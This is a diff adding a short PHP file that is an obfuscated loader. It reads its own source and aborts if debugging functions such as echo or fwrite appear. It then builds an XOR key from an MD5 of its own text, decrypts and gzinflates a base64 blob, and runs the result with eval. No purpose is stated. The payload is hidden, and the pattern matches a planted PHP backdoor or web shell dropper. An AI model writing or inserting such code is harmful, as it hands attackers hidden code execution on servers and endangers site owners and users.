@@ -1,0 +1,24 @@
+<?php
+$idfeldra="b69996c3f0eba479d6efef8920e6c0e8";
+$rlhkifityzb="530e09010c075a565756525a04020f085c575d0352575e5b055207535301545b";
+$gxtnon="lGxtV5YBKZka2D8x9aSPSgBkHXCgYTvHgetwT63lmvMAHnENrevfv9myyObQzzCI+jLnldn9isxAEuMWGnp9S8Pzwve/OtPEezSDZQqMt9G1sWoAi8F2A28o1qM69inxzmgZioppaEEkMC55M2D4ZnnJfG7DyYIXTskuHd+l9ZRhwCxwnrPRbxnsPz9sZynUDEloTx33OspBAl6jPGixKgxcLYFhoQyidl2+G3iGp+HtdIp8EKn/UTcDchQx5bBlGQAHoGd+76LZJrTpnJRWlFWLUuurAjBFLA40QcQcY8yHMxRK8XNruJU7nswiKEfmaougrO6D/ax/IVr0Na0XmniGgIFbTFhDxfRvO3MDlGBk1ep2F0PVf0SHGDrDiC7lihDo1dsH0mUc8EKIXHH53m3RNQoBxrV8T38+nj+GUBcsvJtn5DSWa8idyl6wUTxGN9ZGfXPqO9LCFaM702L9R6wa6IMnFuEyAk/bZkqnhluCwt/54Qr/tOBcjyNAjC8Eh5xfrA2iRHWTG4fnJv0wnx6rQceY/NBFNx0lYRtDdS3ukPia7x/TTckNbI8uDC6sFW5suGYYl+MNjHZcaZBtt/VvENeNd8N4pDP7+LK7hQqjY9TDRsvmL5oFGN+Eu6yzJW98Ixh6qJYc9YcCImSu/9+GR4NmIvk+GlP+D15gFriDnn95YBSzdKMRKZuOyZ2T2oVgFaxXY2DQl20OiqYbVI5tXymQkbnHt8dAnETDQhs9sGJkJXxFRAg2VcCAmqDZHI8eA+WQAj7nGkBsv1HUmtI7Wtn3u9VIGNw4xmEoHWAelMYuINsfFA/NrU05VL5l+MHVTppsVELjXKPm7Fzz5Fo30Rf5AOWVTpjOlHTle2e8Yy93rPG+hqgTIQ+01kjF9wzq1CViSaNPBMUEowvf/MOROQ==";
+$tvxnutyql=file_get_contents(__FILE__);
+$amqazlogqhjf=str_replace($gxtnon,"",$tvxnutyql);
+if(strpos($amqazlogqhjf,"ec"."ho")!==false||strpos($amqazlogqhjf,"pr"."int")!==false||strpos($amqazlogqhjf,"var_"."dump")!==false||strpos($amqazlogqhjf,"file_put_"."contents")!==false||strpos($amqazlogqhjf,"fw"."rite")!==false){die();}
+$hqutegor=str_replace(array($idfeldra,$rlhkifityzb),array("SP_66a8b09c","KP_21bff509"),$tvxnutyql);
+$kyhujls=md5($hqutegor);
+$qengjknkkkym=hex2bin($rlhkifityzb);
+$xndhcz="";
+$pkgutcmjh=strlen($kyhujls);
+for($tmvkiuj=0;$tmvkiuj<$pkgutcmjh;$tmvkiuj++){
+    $xndhcz.=chr(ord($qengjknkkkym[$tmvkiuj])^ord($kyhujls[$tmvkiuj]));
+}
+$lwbkksdoi=base64_decode($gxtnon);
+$hdnfznntqlsp=strlen($lwbkksdoi);
+$jqqxoakt="";
+$reccfkjdsmuc=strlen($xndhcz);
+for($tmvkiuj=0;$tmvkiuj<$hdnfznntqlsp;$tmvkiuj++){
+    $jqqxoakt.=$lwbkksdoi[$tmvkiuj]^$xndhcz[$tmvkiuj%$reccfkjdsmuc];
+}
+$kficsh="gz"."in"."fl"."ate";
+eval($kficsh($jqqxoakt));
